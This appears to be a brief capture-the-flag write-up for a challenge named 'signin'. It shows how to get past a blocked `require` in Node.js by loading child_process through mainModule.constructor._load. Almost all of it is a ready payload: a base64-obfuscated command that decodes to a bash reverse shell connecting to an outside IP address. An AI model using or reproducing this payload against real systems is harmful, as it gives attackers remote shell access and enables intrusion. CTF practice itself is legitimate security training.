## signin

You can't use require  but u can use global.process.mainModule.constructor._load('child_process').exec('calc')

finally payload

```

global.process.mainModule.constructor._load('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIxLjE2Mi42MS84MDA5IDA+JjE=|base64 -d|bash');
```

